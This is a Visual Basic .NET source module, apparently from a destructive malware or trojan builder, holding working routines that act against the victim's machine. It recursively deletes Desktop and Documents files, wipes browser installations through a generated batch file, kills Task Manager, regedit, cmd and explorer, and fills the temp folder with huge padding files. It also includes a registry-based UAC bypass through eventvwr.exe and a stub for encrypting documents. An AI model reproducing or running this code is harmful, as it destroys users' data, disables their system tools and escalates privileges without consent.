Imports System.IO
Imports System.ComponentModel
Imports System.Runtime.InteropServices
Imports System.Net
Imports System.Security.Principal
Imports Microsoft.Win32
Module vir_funcs
    'RandomString(4, , True, True, False, False, True)
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal Command As String, ByVal ReturnString As String, ByVal ReturnLength As Long, ByVal hWnd As Long) As Long
    Private components1 As IContainer
    Private Const TASKBAR_HIDE As Integer = &H80
    Private Const TASKBAR_SHOW As Integer = &H40
    Dim pumpfile As String = System.IO.Path.GetTempPath & "\" & RandomString(4, , True, True, False, False, True) & ".dz"
    Dim pumpfile2 As String = System.IO.Path.GetTempPath & "\" & RandomString(4, , True, True, False, False, True) & ".dz"
    <DllImport("user32", EntryPoint:="FindWindowA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Function FindWindow(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpClassName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpWindowName As String) As Integer
    End Function
    <DllImport("user32", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Public Function SetWindowPos(ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    End Function

#Region "Other"
    Public Function EncodeBase64(input As String) As String
        Return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(input))
    End Function

    Public Function DecodeBase64(input As String) As String
        Return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(input))
    End Function
    Public Function isadmin() As Boolean
        Dim identity = WindowsIdentity.GetCurrent()
        Dim principal = New WindowsPrincipal(identity)
        Dim isElevated As Boolean = principal.IsInRole(WindowsBuiltInRole.Administrator)
        If isElevated Then
            isadmin = True
        Else
            isadmin = False
        End If
    End Function
    Public Function DirSearch(ByVal sDir As String) As List(Of String)
        Dim files As List(Of String) = New List(Of String)()

        Try

            For Each f As String In IO.Directory.GetFiles(sDir)
                files.Add(f)
            Next

            For Each d As String In IO.Directory.GetDirectories(sDir)
                files.AddRange(DirSearch(d))
            Next

        Catch excpt As System.Exception

        End Try

        Return files
    End Function
    Public Function LuncheProc(pth As String)

        Dim My_Process As New Process()
        Dim My_Process_Info As New ProcessStartInfo()

        My_Process_Info.FileName = pth
        My_Process_Info.CreateNoWindow = True
        My_Process_Info.UseShellExecute = False
        My_Process.EnableRaisingEvents = True
        My_Process.StartInfo = My_Process_Info
        My_Process.Start()

    End Function
    Function pump()
        Dim s As New FileInfo(pumpfile)
        If s.Exists = False Then
            File.AppendAllText(pumpfile, "")
        End If
        Dim fakesize As Double = Val(100000)
        fakesize = fakesize * 1048576
        Dim filetopump = IO.File.OpenWrite(pumpfile)
        Dim size = filetopump.Seek(0, IO.SeekOrigin.End)
        While size < fakesize
            filetopump.WriteByte(0)
            size += 1
        End While
        filetopump.Close()
        Dim n As New FileInfo(pumpfile2)
        If n.Exists = False Then
            File.AppendAllText(pumpfile2, "")
        End If
        Dim fakesize2 As Double = Val(100000)
        fakesize2 = fakesize2 * 1048576
        Dim filetopump2 = IO.File.OpenWrite(pumpfile2)
        Dim size2 = filetopump2.Seek(0, IO.SeekOrigin.End)
        While size < fakesize
            filetopump2.WriteByte(0)
            size += 1
        End While
        filetopump2.Close()
    End Function
    Function enc_docu(t As String, thekey As String)
        If t = "True" Then
            Dim crpt As New ElgAESCrypt(thekey)
            Dim docu_path As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
            Dim direc() As String = IO.Directory.GetDirectories(docu_path)
        End If
    End Function
    Private Sub Bypass_UAC(ByVal filepath As String)
        Using regkey As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Classes\mscfile\shell\open\command")
            regkey.SetValue("", filepath, RegistryValueKind.String)
        End Using
        Process.Start("eventvwr.exe")
    End Sub
#End Region
#Region "Dis"
    Function D_custo(Program As String)
        For Each proc As Process In Process.GetProcessesByName(Program)
            proc.Kill()
        Next

    End Function
    Function D_Custo_Proc(Proccs As String)
        For Each proc As Process In Process.GetProcessesByName(Proccs)
            proc.Kill()
        Next
    End Function

    Function Dis_Webbrows(t As String)
        If t = "True" Then
            For Each proc As Process In Process.GetProcessesByName("firefox")
                proc.Kill()
            Next
            For Each proc As Process In Process.GetProcessesByName("opera")
                proc.Kill()
            Next
            For Each proc As Process In Process.GetProcessesByName("iexplore")
                proc.Kill()
            Next
            For Each proc As Process In Process.GetProcessesByName("chrome")
                proc.Kill()
            Next
            For Each proc As Process In Process.GetProcessesByName("safari")
                proc.Kill()
            Next
        End If
    End Function

    Function dis_taskmgr(ByVal t As String)
        If t = "True" Then
            For Each proc As Process In Process.GetProcessesByName("ProcessHacker")
                proc.Kill()
            Next
            For Each proc As Process In Process.GetProcessesByName("taskmgr")
                proc.Kill()
            Next
            For Each proc As Process In Process.GetProcessesByName("processexplorer")
                proc.Kill()
            Next
        End If
    End Function
    Function dis_cmd(t As String)
        If t = "True" Then
            For Each proc As Process In Process.GetProcessesByName("cmd")
                proc.Kill()
            Next
        End If
    End Function

    Function dis_reg(t As String)
        If t = "True" Then
            For Each proc As Process In Process.GetProcessesByName("regedit")
                proc.Kill()
            Next
        End If
    End Function

    Function dis_explo(t As String)
        If t = "True" Then
            For Each proc As Process In Process.GetProcessesByName("explorer")
                proc.Kill()
            Next
        End If
    End Function

#End Region
#Region "Delete"
    Function Dltdsktp()
        On Error Resume Next
        For Each Fil As String In DirSearch(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
            If File.Exists(Fil) = True Then
                If Not Fil = Application.ExecutablePath Then
                    File.Delete(Fil)
                End If
            End If
        Next
        For Each Dir As String In Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
            Directory.Delete(Dir)
        Next
    End Function
    Function DltMydocu()
        On Error Resume Next
        For Each Fil As String In DirSearch(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments))
            If File.Exists(Fil) = True Then
                If Not Fil = Application.ExecutablePath Then
                    File.Delete(Fil)
                End If
            End If
        Next
        For Each Dir As String In Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments))
            Directory.Delete(Dir)
        Next
    End Function
    Function dltWeb()
        Try
            Dim chromepath As String = "C:\Program Files (x86)\Google\Chrome\Application\"
            Dim opera_path As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Programs\Opera\"
            Dim safari As String
            Dim firefox_path As String = "C:\Program Files\Mozilla Firefox\"
            Dim os As String = My.Computer.Info.OSFullName
            If os.Contains("7") Then
                opera_path = "C:\Program Files\Opera"
                chromepath = "C:\Program Files (x86)\Google\Application\"
            End If
            If os.Contains("10") Then
                opera_path = "C:\Users\" & Environment.UserName & "\AppData\Local\Programs\Opera\"
                chromepath = "C:\Program Files (x86)\Google\Chrome\Application\"
            End If
            If os.Contains("xp") Then
                chromepath = "C:\Documents and Settings\" & Environment.UserName & "\Local Settings\Application Data\Google\Chrome"
            End If
            If isadmin() = True Then
                If Directory.Exists(chromepath) = True Then
                    For Each proc As Process In Process.GetProcessesByName("chrome.exe")
                        proc.Kill()
                    Next
                    For Each fiel As String In DirSearch(chromepath)
                        File.Delete(fiel)
                    Next
                End If
                If Directory.Exists(firefox_path) = True Then
                    For Each proc As Process In Process.GetProcessesByName("firefox.exe")
                        proc.Kill()
                    Next
                    For Each fiel As String In DirSearch(firefox_path)
                        File.Delete(fiel)
                    Next
                End If
                If Directory.Exists(opera_path) = True Then
                    For Each proc As Process In Process.GetProcessesByName("opera.exe")
                        proc.Kill()
                    Next
                    For Each fiel As String In DirSearch(opera_path)
                        File.Delete(fiel)
                    Next
                End If
            Else
                If Directory.Exists(chromepath) = True Or Directory.Exists(opera_path) = True Or Directory.Exists(firefox_path) = True Then
                    Dim batch As String = IO.Path.GetTempPath & IO.Path.GetRandomFileName & ".bat"
                    Dim wrt As New StreamWriter(batch)
                    wrt.WriteLine("@echo off")
                    wrt.WriteLine("taskkill /IM chrome.exe")
                    wrt.WriteLine("taskkill /IM firefox.exe")
                    wrt.WriteLine("taskkill /IM opera.exe")
                    wrt.WriteLine("cd " & chromepath)
                    wrt.WriteLine("DEL /F/Q/S *.* > NUL ")
                    wrt.WriteLine("cd " & firefox_path)
                    wrt.WriteLine("DEL /F/Q/S *.* > NUL ")
                    wrt.WriteLine("cd " & opera_path)
                    wrt.WriteLine("DEL /F/Q/S *.* > NUL ")

                    wrt.Close()
                    LuncheProc(batch)
                    Bypass_UAC(batch)
                End If
            End If
        Catch ex As Exception
        End Try
    End Function
#End Region
#Region "Spamme"
    Function open_close_cddrive(t As String)
        If t = "True" Then
            Try
                mciSendString("set cdaudio door open", 0, 0, 0)
                mciSendString("set cdaudio door Closed", 0, 0, 0)
            Catch ex As Exception
            End Try
        End If
    End Function
    Function Spmskul(t As String, ByVal lnk As String)

        If t = "True" Then
            If Not lnk = Nothing Then

                Dim wb1 = New WebClient()
                Dim pats As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & RandomString(4, , True, True, False, False, True) & ".png"
                wb1.DownloadFile(lnk, pats)
            Else
                Dim s As Image
                s = My.Resources.skul_pic
                s.Save(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & RandomString(4, , True, True, False, False, True) & ".png")
            End If


        End If


    End Function
#End Region
End Module
